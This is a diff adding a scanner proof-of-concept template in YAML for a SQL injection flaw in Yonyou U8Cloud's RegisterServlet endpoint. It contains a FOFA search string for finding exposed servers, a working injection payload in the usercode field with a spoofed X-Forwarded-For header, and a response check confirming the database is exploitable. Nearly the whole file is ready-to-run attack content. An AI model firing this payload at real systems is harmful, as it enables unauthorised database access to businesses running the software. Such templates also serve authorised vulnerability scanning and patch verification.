@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-u8cloud-servlet-registerservlet-sqli
+info:
+  name: 用友U8Cloud servlet-RegisterServlet SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: body="开启U8 cloud云端之旅"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /servlet/RegisterServlet
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    X-Forwarded-For: 127.0.0.1
+  data: usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{.t1}}')),3,32)>0--
+  expression: status_code == 200 && contains(body,"nvarchar") && contains(body,t2)
+    && !contains(body,"<")
+transport: http
